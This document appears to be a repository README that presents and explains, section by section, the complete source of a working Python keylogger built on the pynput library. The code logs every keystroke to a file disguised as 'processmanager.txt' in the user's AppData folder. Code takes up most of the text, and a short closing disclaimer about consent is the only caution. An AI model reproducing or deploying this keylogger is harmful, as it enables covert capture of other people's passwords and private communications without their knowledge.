# Key_Logger

This code is a simple keylogger written in Python using the `pynput` library. A keylogger is a program that records the keystrokes on a computer. Let me break down the code and explain each part:

1. **Importing Libraries:**
    ```python
    import os
    from pynput.keyboard import Listener
    ```
   - The code imports the necessary libraries: `os` for operating system-related functionalities and `Listener` from `pynput.keyboard` for monitoring keyboard events.

2. **Global Variables:**
    ```python
    keys = []
    count = 0
    path = os.environ['appdata'] + '\\processmanager.txt'
    ```
   - `keys`: A list to store the pressed keys.
   - `count`: A counter to keep track of the number of keys pressed before writing to the file.
   - `path`: The path to the file where the keystrokes will be logged. The file is named `processmanager.txt` and is stored in the `appdata` directory.

3. **on_press Function:**
    ```python
    def on_press(key):
        global keys, count 
        keys.append(key)
        count += 1

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []
    ```
   - This function is called whenever a key is pressed.
   - It appends the pressed key to the `keys` list and increments the `count`.
   - When `count` reaches a certain threshold (in this case, 1), it resets the count, calls `write_file` to log the keys, and clears the `keys` list.

4. **write_file Function:**
    ```python
    def write_file(keys):
        with open(path, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find('backspace') > 0:
                    f.write(' Backspace ')
                elif k.find('enter') > 0:
                    f.write('\n')
                elif k.find('shift') > 0:
                    f.write(' Shift ')
                elif k.find('space') > 0:
                    f.write(' ')
                elif k.find('caps_lock') > 0:
                    f.write(' caps_lock ')
                elif k.find('Key'):
                    f.write(k)
    ```
   - This function writes the logged keys to the specified file.
   - It iterates through the `keys` list, processes each key, and writes the corresponding text to the file. Certain keys like 'backspace', 'enter', 'shift', 'space', and 'caps_lock' are handled specially.

5. **Listener and Main Execution:**
    ```python
    with Listener(on_press=on_press) as listener:
        listener.join()
    ```
   - This block sets up a keyboard listener using `pynput`.
   - The `on_press` function is specified as the callback function for handling key presses.
   - The listener is started with `listener.join()`, and it will continue running until it is stopped manually (typically by terminating the script).

Note: Keyloggers can be misused for unethical purposes, and using them without proper consent is illegal. Always ensure that you have the right to monitor or log keyboard activities, and use such tools responsibly and ethically.
